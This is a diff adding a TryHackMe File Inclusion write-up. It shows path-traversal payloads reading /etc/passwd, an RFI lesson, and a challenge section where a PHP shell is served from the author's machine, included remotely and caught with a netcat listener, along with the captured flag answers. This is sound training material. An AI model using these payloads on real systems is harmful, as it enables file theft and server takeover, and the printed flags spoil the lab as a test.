@@ -156,3 +156,161 @@ Warning: file_get_contents(w) [function.file-get-contents]: failed to open strea
 ```
 Which function is causing the directory traversal in Lab #4?
 *file_get_contents*
+```lab5
+http://10.10.61.224/lab5.php?file=/....//....//....//....//etc/passwd%00
+File Inclusion Lab
+
+Lab #5: Include a file in the input form below
+File Name
+Current Path
+/var/www/html
+File Content Preview of /....//....//....//....//etc/passwd
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false 
+
+or
+http://10.10.61.224/lab5.php?file=/....//....//....//....//etc/passwd/.
+
+or
+http://10.10.61.224/lab5.php?file=/....//....//....//....//etc/passwd
+```
+```lab 6
+http://10.10.61.224/lab6.php?file=w
+File Inclusion Lab
+
+Lab #6: Include a file in the input form below
+File Name
+Current Path
+/var/www/html
+File Content Preview of w
+Access Denied! Allowed files at THM-profile folder only!
+```
+Try out Lab #6 and check what is the directory that has to be in the input field?
+*THM-profile*
+```lab 6
+http://10.10.61.224/lab6.php?file=THM-profile/../../../../etc/passwd/.
+File Inclusion Lab
+
+Lab #6: Include a file in the input form below
+File Name
+Current Path
+/var/www/html
+File Content Preview of THM-profile/../../../../etc/passwd/.
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false
+```
+```text
+http://10.10.61.224/lab6.php?file=THM-profile/../../../../etc/os-release/.
+
+Current Path
+/var/www/html
+File Content Preview of THM-profile/../../../../etc/os-release/.
+NAME="Ubuntu" VERSION="12.04.5 LTS, Precise Pangolin" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu precise (12.04.5 LTS)" VERSION_ID="12.04"
+```
+Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value? *12.04*
+### Remote File Inclusion - RFI
+Remote File Inclusion - RFI
+Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.
+The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:
+Sensitive Information Disclosure
+Cross-site Scripting (XSS)
+Denial of Service (DoS)
+An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.
+RFI steps
+The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM.
+<?PHP echo "Hello THM"; ?>
+First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.
+Visit the following lab URL: http://10.10.61.224/playground.php to try out an RFI attack.
+We showed how to include PHP pages via RFI. Do research on how to get remote command execution (RCE), and answer the question in the challenge section.
+*No answer needed*
+### Remediation
+As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:
+Keep system and services, including web application frameworks, updated with the latest version.
+Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
+A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
+Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
+Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
+Never trust user input, and make sure to implement proper input validation against file inclusion.
+Implement whitelisting for file names and locations as well as blacklisting.
+Ready for the challenges?
+*No answer needed*
+### Challenge
+Great Job! Now apply the techniques you've learned to capture the flags! Familiarizing yourself with HTTP Web basics could help you complete these challenges.
+Make sure the attached VM is up and running then visit: http://10.10.61.224/challenges/index.php
+Steps for testing for LFI
+Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!
+Enter a valid input to see how the web server behaves.
+Enter invalid inputs, including special characters and common file names.
+Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
+Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
+Understand the input validation and if there are any filters!
+Try the inject a valid entry to read sensitive files
+
+## Exploitation
+```text
+curl -X POST http://10.10.61.224/challenges/chall1.php -d 'file=../../../../etc/flag1'
+
+ <div class='mt-5 mb-5'>
+          <h5>Current Path</h5>
+          <div class='file-Location'><code>/var/www/html</code></div>
+        </div>
+        <div>
+          <h5>File Content Preview of <b>../../../../etc/flag1</b></h5>
+          <code>F1x3d-iNpu7-f0rrn
+</code>
+    </div>  </body>
+</html>
+```
+`Change the form method to POST in the page source or use a tool like Burp to modify the method of the request POST`
+`visit http://10.10.61.224/challenges/index.php`
+![[Pasted image 20220821122714.png]]
+`POST/Content-Type: application/x-www-form-urlencoded/file=/etc/flag1`
+Capture Flag1 at /etc/flag1 *F1x3d-iNpu7-f0rrn*
+`First, change cookie parameter; THM to admin and then after once you login as Admin, change THM to ../../../../etc/flag2%00`
+![[Pasted image 20220821123458.png]]
+Capture Flag2 at /etc/flag2 *c00k13_i5_yuMmy1*
+![[Pasted image 20220821123952.png]]
+Capture Flag3 at /etc/flag3 *P0st_1s_w0rk1in9*
+```monkey php change vpn ip and port
+┌──(kali㉿kali)-[~/Downloads/hacked]
+└─$ ls
+Capture.pcapng  shell.php
+                                                                                 (start simple http server)
+```
+```monkey php change vpn ip and port
+┌──(kali㉿kali)-[~/Downloads/hacked]
+└─$ python3 -m http.server                  
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.61.224 - - [21/Aug/2022 13:49:03] "GET /shell.php HTTP/1.1" 200 -
+```
+```after file upload ur file
+http://10.10.61.224/playground.php?file=http://10.18.1.77:8000/shell.php
+```
+```start netcat listener
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -nlvp 4444    
+listening on [any] 4444 ...
+connect to [10.18.1.77] from (UNKNOWN) [10.10.61.224] 54644
+Linux lfi-vm-thm-f8c5b1a78692 5.4.0-1057-aws #60~18.04.1-Ubuntu SMP Thu Sep 9 20:38:09 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 17:49:04 up  2:07,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+whoami
+www-data
+hostname
+lfi-vm-thm-f8c5b1a78692
+```
+Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output? *lfi-vm-thm-f8c5b1a78692*
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/42921fa9ea04452912025351a430679d.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/45d9c1baacda290c1f95858e27f740c9.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c12d34456ebe25bafffeb829c58f98c0.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png)
+
+## Notes / Lessons Learned
+[[IDOR]]
+
